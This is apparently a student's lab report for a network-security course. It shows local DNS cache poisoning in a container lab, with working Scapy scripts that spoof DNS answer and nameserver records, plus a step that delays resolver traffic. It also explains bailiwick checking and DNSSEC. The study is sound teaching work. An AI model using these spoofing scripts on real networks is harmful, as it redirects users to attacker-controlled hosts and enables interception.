
#import "@preview/quill-assignment:0.1.0": *

#show: assignment.with(
  title: "DNS Attacks",
  subtitle: "Local DNS cache poisoning using Scapy",
  course: "UE24CS343AB6: Computer Network Security",
  assignment: "Assignment 5",
  student: "Sumedh Girish",
  instructor: "Dr. Preet Kanwal",
  department: "Department of Computer Science and Engineering",
  university: "PES University",
  date: datetime.today(),
  theme: "nord-light",
  cover-page: true,
  cover-style: "swiss",
  doc-ref: "QUILL-ASSIGN",
  rev: "1.6",
  scale: "N.T.S.",
)

#show link: set text(fill: blue, weight: "bold")

= Local DNS Cache poisoning

The DNS attack attempts to redirect internet packets at the transport layer by
modifying the resolution system that systems use while translating human-readable
domain names to thier IP equivalent addresses. On success, an atttacker would
be able to pretend to be another legitimate service and gain access to unauthorized
information and even compromize vulnerable machines.

We begin by starting up the container environment in the VM that would make
such an attack possible.

#figure(
  image("assets/20260907104509.png"),
  caption: "Starting up container environment",
)

The environment makes the following configuration changes to default setup of
the system.

1. The DNSSEC option is turned off on the Local DNS Server. Without this, spoofing
  to the Sever from attacker would be impossible due to incomplete Chain of Trust.
2. The Local DNS Server is setup to forward table to attacker server directly, as
  the attacker NS is not registered under root authority tree.
3. The attacker container is given access to monitor Local DNS server traffic.
  This may not always be possible from just any attacker system.

Because of this, we must first check if our configuration is correct and
the nameservers can respond to queries.

#figure(
  image("assets/20260907105047.png"),
  caption: [`dig` attacker nameserver to check availability],
)

#figure(
  image("assets/20260907105126.png"),
  caption: [Trying to access `www.example.com` via *local* DNS server],
)

#figure(
  image("assets/20260907105154.png"),
  caption: [Trying to access `www.example.com` via *attacker* DNS server],
)

Now a succesful attacker would convince a user into asking the attecker NS
in a normal query.

#pagebreak()

= Task 1

The most straightforward way to do this is to spoof the reply from the Local
DNS server before that original reply arrives. To do this we simply need to
listen for packets asking the Local server to resolve requests and reply to
target packets from attacker machine.

We do this using the below code.

```python
@staticmethod
def _1():

    TARGET = "www.example.com"

    def spoof_dns(pkt):
        if (
            pkt.haslayer(DNS)
            and pkt.haslayer(DNSQR)
            and TARGET in pkt[DNSQR].qname.decode("utf-8")
            and pkt[DNS].qr == 0
        ):
            print(f"Got DNS Query: {pkt[IP].summary()}")

            resp = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=pkt[DNSQR].qname,
                        type="A",
                        rclass="IN",
                        ttl=86400,
                        rdata="1.2.3.4",
                    ),
                )
            )

            send(resp)

    _ = sniff(
        iface=ATTACKER_IFACE,
        prn=spoof_dns,
        filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
    )
```

We simply spoof all queries to resolve `www.example.com` to fake IP `1.2.3.4`.

#note[
  Do not forget to clear the Local DNS cache to rid it of previous `dig` resolution
  before performing this attack.

  #figure(
    image("assets/20260907110136.png"),
    caption: [Clearing the Local DNS cache],
  )
]

#figure(
  image("assets/20260908104726.png"),
  caption: [Result when attacket spoofs user DNS request with bad IP],
)

#figure(
  image("assets/20260908104752.png"),
  caption: [Attacker view of spoofing DNS packet to user],
)

#figure(
  image("assets/20260908105158.png"),
  caption: [Packet from user to Local DNS on wireshark],
)

#figure(
  image("assets/20260908105211.png"),
  caption: [Spoofed packet from attacker on wireshark],
)

#figure(
  image("assets/20260908105516.png"),
  caption: [
    Original packet from Local DNS Server(which never reaches the user as client
    closes port after attacker packet is recieved)
  ],
)

#pagebreak()

= Task 2

A downside to previous attack is that every request from the user would need to
be intercepted individually. This makes maintaining the attack very cumbersome.
Furthermore, each instance running on attacker only affects 1 single target
user.

Thus a better tactic would be to instead try and poison the Local DNS server
itself. This resolves the above issues. This is way we present in this task.

The code itself *does not need to change* from before. This is because the earlier
program does not distinguish between user and local DNS and spoofs everything.
This is also why the attacker screen had 2 packets sent.

However we do need to ensure that the reply from the internet does not arrive
before our own packet by slowing down the `qdisc` queue of the kernel!

#figure(
  image("assets/20260908113446.png"),
  caption: [
    Increasing latency of qdisc queue to ensure attacker packet arrives first
  ],
)

Then we can see that the Local DNS cache gets updated to resolve `www.example.com`
to `1.2.3.4` as required.

#figure(
  image("assets/20260908113612.png"),
  caption: [
    Wireshark capture of attacker packet poisoning Local DNS cache for 1 record
  ],
)

#figure(
  image("assets/20260908113644.png"),
  caption: [
    Poisoned cache on Local DNS server
  ],
)

#pagebreak()

= Task 3

One more issue after the previous approach could be that subdomains to the given
domain do not get affected by the poisoned cache. This makes spoofing requests
to websites with many sub-pages tricky.

This is where we introduce the attacker nameserver. The job of this server is to
pretend to be the authoritative server for target domain. This allows all resolution
related to that domain to be attacker controlled.

We do this by trying to poision the Authoritative Record for the domain, rather
than the single record itself. By doing this, the entire zone for that domain
becomes compromized.

This can be done as follows.

```python
@staticmethod
def _3():

    TARGET_QRY = "_.example.com"
    TARGET_REPLY = "example.com"

    def spoof_dns_ns(pkt):
        if (
            pkt.haslayer(DNS)
            and pkt.haslayer(DNSQR)
            and TARGET_QRY in pkt[DNSQR].qname.decode("utf-8")
            and pkt[DNS].qr == 0
        ):
            print(f"Got DNS Query: {pkt[IP].summary()}")

            resp = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=0,
                    nscount=1,
                    qd=pkt[DNS].qd,
                    ns=DNSRR(
                        rrname=TARGET_REPLY.encode(),
                        type="NS",
                        rclass="IN",
                        ttl=86400,
                        rdata=ATTACKER_NS,
                    ),
                )
            )

            send(resp)

    _ = sniff(
        iface=ATTACKER_IFACE,
        prn=spoof_dns_ns,
        filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
    )
```

Here the only change from before is that we now populate the `ns` section of the
record instead of the `an` answer section.

Performing this attack, we see that the request is succesfully redirected to the
attacker name server.

#figure(
  image("assets/20260908134911.png"),
  caption: [`dig` query resolution when local dns cache is poisoned],
)

#figure(
  image("assets/20260908134917.png"),
  caption: [Attacker view of spoofing packet to local dns server],
)

#figure(
  image("assets/20260908134933.png"),
  caption: [Wireshark capture of spoofed attacker packet],
)

#figure(
  image("assets/20260908134959.png"),
  caption: [Poisoned cache on local server],
)

This way we can even route requests to other subdomains under the target
domain.

#figure(
  image("assets/20260908135047.png"),
  caption: [`dig` on subdomains under target domain after cache poisoning],
)


#figure(
  image("assets/20260908135108.png"),
  caption: [Poisoned cache on local server with subdomain records],
)

#pagebreak()

= Task 4

If we are feeling lucky, we might try to spoof the record for an unrelated domain
in the same manner. However, this *does not work*. This is due to a mechanism
known as *Bailiwick Checking*.

This checks if the target authoritative server falls under the zone that the
requested NS has authority over. If not, the record is ignored. We can try this
by trying to redirect resolution for `www.google.com` from the packet resolving
`www.example.com`.

This can be done by simply adding another record to previous code.

```python
TARGET_QRY = "_.example.com"
TARGET_REPLY1 = "example.com"
TARGET_REPLY2 = "google.com"

resp = (
    IP(dst=pkt[IP].src, src=pkt[IP].dst)
    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
    / DNS(
        id=pkt[DNS].id,
        qr=1,
        aa=0,
        qd=pkt[DNS].qd,
        ns=[
            DNSRR(
                rrname=TARGET_REPLY1.encode(),
                type="NS",
                rclass="IN",
                ttl=86400,
                rdata=ATTACKER_NS,
            ),
            DNSRR(
                rrname=TARGET_REPLY2.encode(),
                type="NS",
                rclass="IN",
                ttl=86400,
                rdata=ATTACKER_NS,
            ),
        ],
    )
)
```

Running the code shows us that the cache for `www.google.com` remains unchanged
even after the packet is recieved first.

#figure(
  image("assets/20260909102141.png"),
  caption: [Wireshark capture of packet with spurious NS record],
)

#figure(
  image("assets/20260909102154.png"),
  caption: [Failed redirection on user machine],
)

#figure(
  image("assets/20260909102204.png"),
  caption: [Attacker view with spurious record generation],
)

#figure(
  image("assets/20260909102314.png"),
  caption: [Unaffected cache entries],
)

#pagebreak()

= Task 5

Finally, we try to enter information into the additional section of DNS packets.
This should not have any affect on modern systems and resolvers since they are
programmed to ignore the section aggresively, as this section was used in the
past to easily poison DNS servers.

The below code does the attack.

```python
@staticmethod
def _5():

    TARGET_QRY = "_.example.com"
    TARGET_REPLY1 = "example.com"
    TARGET_REPLY2 = "google.com"

    def spoof_dns_ns(pkt):
        if (
            pkt.haslayer(DNS)
            and pkt.haslayer(DNSQR)
            and TARGET_QRY in pkt[DNSQR].qname.decode("utf-8")
            and pkt[DNS].qr == 0
        ):
            print(f"Got DNS Query: {pkt[IP].summary()}")

            resp = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=0,
                    qd=pkt[DNS].qd,
                    ar=[
                        DNSRR(
                            rrname=TARGET_REPLY1.encode(),
                            type="NS",
                            rclass="IN",
                            ttl=86400,
                            rdata=ATTACKER_NS,
                        ),
                        DNSRR(
                            rrname=TARGET_REPLY2.encode(),
                            type="NS",
                            rclass="IN",
                            ttl=86400,
                            rdata=ATTACKER_NS,
                        ),
                    ],
                )
            )

            send(resp)

    _ = sniff(
        iface=ATTACKER_IFACE,
        prn=spoof_dns_ns,
        filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
    )
```

Running the code shows the following wireshark capture with additional section
containing required information.

#figure(
  image("assets/20260909102456.png"),
  caption: [Wireshark capture of spoofed packet with additional section],
)
